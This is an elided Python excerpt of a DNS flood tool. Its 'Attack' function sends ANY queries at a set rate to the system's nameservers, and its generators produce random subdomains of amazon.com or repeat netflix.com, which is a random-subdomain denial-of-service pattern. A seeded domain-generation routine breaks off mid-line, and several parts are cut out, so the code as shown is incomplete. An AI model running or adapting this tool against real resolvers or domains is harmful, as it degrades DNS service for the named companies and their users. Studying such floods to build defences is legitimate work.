...
def Attack(domain_generator,attacktimeinS=1,qps=5,logfile = 'attack.log'):
    logging.basicConfig(filename=logfile, level=logging.INFO)
    logging.info('%s Started %s. ',datetime.now(),'#'*20)
    logging.info('attackrate = %d qps, attacktime = %d s, Domain Generator = %s',\
                 qps,\
                 attacktimeinS,\
                 domain_generator.__name__)
    now = datetime.now()
    while True:
        if datetime.now()>= now+timedelta(seconds = attacktimeinS):
            break
        domain = domain_generator.domain()
        sendtime = datetime.now()
        logging.info('%s %s',datetime.now(),domain)
        dnsquery(domain,'ANY')
        while True: # to adjust qps.
            if datetime.now() >= sendtime + timedelta(seconds = 1/qps):
                break
...
def dnsquery(qname,rdtype=dns.rdatatype.NS, rdclass=dns.rdataclass.IN,
       ...
       # while response is None:
        ...
        for nameserver in default.nameservers:
            dns.query.udp(request,nameserver,timeout = timeout) 
########  ### Random Subdomain Generation

class randomsubdomain():
        def __init__(self,dname = 'amazon', TLD = 'com',subdomainlen=8):
            self.domainname = dname
            self.TLD = TLD
            self.subdomainlen = subdomainlen
            self.__name__ = 'random subdomain'
        def domain(self):
            subdomain = ''
            for i in range(self.subdomainlen):
                subdomain +=random.choice(string.ascii_letters+string.digits)
            return subdomain+'.'+self.domainname+'.'+self.TLD    
class valid_domain():
    def __init__(self,dname= 'netflix.com'):
        self.dname = dname
        self.__name__ = 'valid domain'
    def domain(self):
        return self.dname
##############
class randomdomain():
    def __init__(self):
        self.__name__ = 'random domain'
    def domain(self):
...
def choose_word(word_list):
    ...
    domain_seed = (((((((((((domain_seed & 0xFFFF) * const1) & 0xFFFF) * ttime) & 0xFFFF) * const2) & 0xFFFF) *
